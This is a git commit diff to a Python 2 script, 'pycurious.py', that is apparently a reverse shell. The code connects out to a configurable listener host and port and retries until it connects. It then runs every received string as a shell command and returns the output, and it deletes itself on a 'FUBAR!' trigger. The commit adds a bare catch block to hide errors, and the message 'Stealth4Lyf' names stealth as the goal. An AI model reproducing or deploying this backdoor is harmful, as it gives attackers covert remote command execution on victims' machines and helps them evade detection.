5778df6a2488bc1474f923ba27d8bbe86c2cd9a0
Ben Leonard-Lagarde <fbe22e62@opayq.com>
2015-10-07 14:15:52 +0100

    Added catch block to prevent any error logs
    Stealth4Lyf

--- pycurious.py
+++ pycurious.py
@@ -2,8 +2,10 @@
 import subprocess, socket, sys, time
 
 # Change these values to match your listening host machine
-host = "192.168.1.97"
+host = "127.0.0.1"
 port = 2015
+# This value corresponds to the time period in seconds in between connection attempts
+retry = 300
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 while True:
@@ -11,21 +13,24 @@ while True:
 		sock.connect((host, port))
 		break
 	except Exception, e:
-		time.sleep(30)
+		time.sleep(retry)
 		pass
 sock.send("***Connection established, use qqq to exit***\n")
 
-while 1:
-	#Ensure this value is a (relatively) low power of 2
-	data = sock.recv(4096)
-	# Use this this to close the connection
-	if "qqq" in data:
-		break
-	# If detected use this to delete the file from the machine, should work even if file is renamed (Experimental...)
-	if "FUBAR!" in data:
-		subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
-		break
-	process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	stdout_val = process.stdout.read() + process.stderr.read()
-	sock.send(stdout_val)
-sock.close()
+try:
+	while 1:
+		#Ensure this value is a (relatively) low power of 2
+		data = sock.recv(4096)
+		# Use this this to close the connection
+		if "qqq" in data:
+			break
+		# If detected use this to delete the file from the machine, should work even if file is renamed (Experimental...)
+		if "FUBAR!" in data:
+			subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
+			break
+		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		stdout_val = process.stdout.read() + process.stderr.read()
+		sock.send(stdout_val)
+	sock.close()
+except:
+	pass
